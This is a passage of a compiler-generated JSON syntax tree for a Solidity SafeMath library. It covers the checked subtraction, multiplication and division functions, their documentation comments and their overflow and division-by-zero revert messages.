														"nodeType": "Identifier",
														"overloadedDeclarations": [
															262,
															290
														],
														"referencedDeclaration": 290,
														"src": "1358:3:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 259,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1358:43:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 254,
												"id": 260,
												"nodeType": "Return",
												"src": "1351:50:1"
											}
										]
									},
									"documentation": {
										"id": 246,
										"nodeType": "StructuredDocumentation",
										"src": "1016:253:1",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 262,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 251,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 248,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 262,
												"src": "1287:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 247,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1287:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 250,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 262,
												"src": "1298:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 249,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1298:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1286:22:1"
									},
									"returnParameters": {
										"id": 254,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 253,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 262,
												"src": "1332:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 252,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1332:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1331:9:1"
									},
									"scope": 412,
									"src": "1274:134:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 289,
										"nodeType": "Block",
										"src": "1787:92:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 277,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 275,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 267,
																"src": "1805:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 276,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 265,
																"src": "1810:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1805:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 278,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 269,
															"src": "1813:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 274,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1797:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 279,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1797:29:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 280,
												"nodeType": "ExpressionStatement",
												"src": "1797:29:1"
											},
											{
												"assignments": [
													282
												],
												"declarations": [
													{
														"constant": false,
														"id": 282,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 289,
														"src": "1836:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 281,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1836:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 286,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 285,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 283,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 265,
														"src": "1848:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 284,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 267,
														"src": "1852:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1848:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1836:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 287,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 282,
													"src": "1871:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 273,
												"id": 288,
												"nodeType": "Return",
												"src": "1864:8:1"
											}
										]
									},
									"documentation": {
										"id": 263,
										"nodeType": "StructuredDocumentation",
										"src": "1414:273:1",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 290,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 270,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 265,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 290,
												"src": "1705:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 264,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1705:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 267,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 290,
												"src": "1716:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 266,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1716:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 269,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 290,
												"src": "1727:26:1",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 268,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "1727:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1704:50:1"
									},
									"returnParameters": {
										"id": 273,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 272,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 290,
												"src": "1778:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 271,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1778:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1777:9:1"
									},
									"scope": 412,
									"src": "1692:187:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 324,
										"nodeType": "Block",
										"src": "2186:392:1",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 302,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 300,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 293,
														"src": "2418:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 301,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2423:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2418:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 306,
												"nodeType": "IfStatement",
												"src": "2414:45:1",
												"trueBody": {
													"id": 305,
													"nodeType": "Block",
													"src": "2426:33:1",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 303,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2447:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"functionReturnParameters": 299,
															"id": 304,
															"nodeType": "Return",
															"src": "2440:8:1"
														}
													]
												}
											},
											{
												"assignments": [
													308
												],
												"declarations": [
													{
														"constant": false,
														"id": 308,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 324,
														"src": "2469:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 307,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2469:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 312,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 311,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 309,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 293,
														"src": "2481:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 310,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 295,
														"src": "2485:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2481:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2469:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 318,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 316,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 314,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 308,
																	"src": "2504:1:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 315,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 293,
																	"src": "2508:1:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "2504:5:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 317,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 295,
																"src": "2513:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2504:10:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 319,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2516:35:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 313,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2496:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 320,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2496:56:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 321,
												"nodeType": "ExpressionStatement",
												"src": "2496:56:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 322,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 308,
													"src": "2570:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 299,
												"id": 323,
												"nodeType": "Return",
												"src": "2563:8:1"
											}
										]
									},
									"documentation": {
										"id": 291,
										"nodeType": "StructuredDocumentation",
										"src": "1885:229:1",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 325,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 296,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 293,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 325,
												"src": "2132:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 292,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2132:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 295,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 325,
												"src": "2143:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 294,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2143:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2131:22:1"
									},
									"returnParameters": {
										"id": 299,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 298,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 325,
												"src": "2177:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 297,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2177:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2176:9:1"
									},
									"scope": 412,
									"src": "2119:459:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 341,
										"nodeType": "Block",
										"src": "3100:63:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 336,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 328,
															"src": "3121:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"id": 337,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 330,
															"src": "3124:1:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 338,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3127:28:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 335,
														"name": "div",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															342,
															370
														],
														"referencedDeclaration": 370,
														"src": "3117:3:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$_t_string_memory_ptr_$returns$_t_uint256_$",
															"typeString": "function (uint256,uint256,string memory) pure returns (uint256)"
														}
													},
													"id": 339,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3117:39:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 334,
												"id": 340,
												"nodeType": "Return",
												"src": "3110:46:1"
											}
										]
									},
									"documentation": {
										"id": 326,
										"nodeType": "StructuredDocumentation",
										"src": "2584:444:1",
										"text": " @dev Returns the integer division of two unsigned integers. Reverts on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 342,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 331,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 328,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 342,
												"src": "3046:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 327,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3046:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 330,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 342,
												"src": "3057:9:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 329,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3057:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3045:22:1"
									},
									"returnParameters": {
										"id": 334,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 333,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 342,
												"src": "3091:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 332,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3091:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3090:9:1"
									},
									"scope": 412,
									"src": "3033:130:1",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 369,
										"nodeType": "Block",
										"src": "3733:243:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 357,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 355,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 347,
																"src": "3817:1:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 356,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3821:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3817:5:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 358,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 349,
															"src": "3824:12:1",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 354,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3809:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 359,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3809:28:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 360,
												"nodeType": "ExpressionStatement",
												"src": "3809:28:1"
											},
											{
												"assignments": [
													362
												],
												"declarations": [
													{
														"constant": false,
														"id": 362,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 369,
														"src": "3847:9:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 361,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3847:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 366,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 365,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 363,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 345,
														"src": "3859:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 364,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 347,
														"src": "3863:1:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3859:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3847:17:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 367,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 362,
													"src": "3968:1:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 353,
												"id": 368,
												"nodeType": "Return",
